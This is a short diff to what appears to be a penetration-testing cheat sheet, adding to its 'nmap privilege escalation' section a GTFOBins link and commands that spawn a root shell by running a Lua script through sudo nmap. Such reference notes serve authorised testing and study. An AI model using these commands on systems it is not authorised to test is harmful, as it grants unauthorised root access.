@@ -620,9 +620,14 @@ char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
 
 ### nmap privilege escalation
 
+https://gtfobins.github.io/gtfobins/nmap/#shell
 ```
 nmap --interactive
 !sh
+
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF
 ```
 
 ### Getting shell using SUID cp. Thanks to @iiLegacyyii
